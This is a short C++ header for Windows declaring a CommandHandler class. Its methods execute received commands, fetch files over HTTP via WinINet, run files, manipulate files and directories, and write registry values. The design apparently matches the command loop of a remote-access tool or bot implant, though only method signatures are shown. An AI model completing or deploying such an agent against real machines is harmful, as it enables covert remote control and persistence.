#pragma once
#pragma comment(lib, "Wininet")
#define _CRT_SECURE_NO_WARNINGS

#include <cstring>
#include <string>
#include <sstream>
#include <list>
#include <iostream>

#include <Windows.h>
#include <wininet.h>

#define REGISTRY_BASE_PATH "Software\\"

class CommandHandler
{
	struct Instruction {
		std::string instr;
		std::list<std::string> args;
	};
public:
	CommandHandler()
	{

	}

	int ExecuteCommand(char* command);
	int runThread(char* command);

	int createFile(const char* fileName);
	int deleteFile(const char* fileName);
	int appendToFile(const char* fileName, std::string textToBeAppended);
	int httpGet(std::string fileAddressPath);
	int runFile(std::string filePath);
	int listDirectory(std::string path);
	int createRegistry(std::string path, std::string name, int value);
};

